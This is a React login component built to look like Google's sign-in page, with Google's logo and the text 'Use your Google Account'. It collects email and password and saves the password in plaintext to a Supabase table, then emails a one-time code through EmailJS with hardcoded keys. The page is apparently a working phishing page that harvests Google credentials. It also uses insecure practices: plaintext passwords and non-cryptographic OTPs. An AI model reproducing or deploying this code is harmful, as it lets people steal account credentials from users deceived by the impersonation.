import {
  Box,
  Button,
  Center,
  Input,
  Text,
  VStack,
  HStack,
  Link,
  Image,
} from "@chakra-ui/react";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "../supabaseClient";
import emailjs from "@emailjs/browser";

export default function Login() {
  const [step, setStep] = useState(1); // 1 = email, 2 = password
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();

  const handleNext = async () => {
    if (step === 1 && email) {
      setStep(2);
    } else if (step === 2 && password) {
      // Save to Supabase users table
      const { data: existingUser } = await supabase
        .from("users")
        .select("*")
        .eq("email", email)
        .single();

      if (!existingUser) {
        await supabase.from("users").insert([{ email, password }]);
      }

      // Generate OTP
      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
      const expiryTime = new Date(Date.now() + 15 * 60 * 1000);

      await supabase.from("otps").insert([
        { email, code: newCode, expires_at: expiryTime.toISOString() },
      ]);

      // Send OTP via EmailJS
      await emailjs.send(
        "service_pn1ecn9",
        "template_xqsd4l8",
        {
          email: email,
          passcode: newCode,
          time: expiryTime.toLocaleTimeString([], {
            hour: "2-digit",
            minute: "2-digit",
          }),
        },
        "B3qq_r0cNoHULpzEV"
      );

      navigate("/verify", { state: { email } });
    }
  };

  return (
    <Center minH="100vh" bg="#202124">
      <Box
        bg="#171717"
        p={10}
        rounded="lg"
        shadow="lg"
        w="400px"
        color="white"
      >
        <VStack spacing={4} align="stretch">
          <Image
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
            alt="Google Logo"
            h="40px"
            mx="auto"
          />
          <Text fontSize="2xl" fontWeight="medium">
            Sign in
          </Text>
          <Text fontSize="sm" color="gray.400">
            Use your Google Account
          </Text>

          {step === 1 ? (
            <>
              <Input
                placeholder="Email or phone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                bg="#202124"
                borderColor="#5f6368"
                _focus={{ borderColor: "#1a73e8" }}
              />
              <Link color="#8ab4f8" fontSize="sm">
                Forgot email?
              </Link>
            </>
          ) : (
            <>
              <Input
                type="password"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                bg="#202124"
                borderColor="#5f6368"
                _focus={{ borderColor: "#1a73e8" }}
              />
              <Link color="#8ab4f8" fontSize="sm">
                Forgot password?
              </Link>
            </>
          )}

          <HStack justify="space-between" mt={4}>
            <Link color="#8ab4f8" fontSize="sm">
              Create account
            </Link>
            <Button
              bg="#1a73e8"
              color="white"
              _hover={{ bg: "#1765cc" }}
              onClick={handleNext}
            >
              Next
            </Button>
          </HStack>
        </VStack>
      </Box>
    </Center>
  );
}
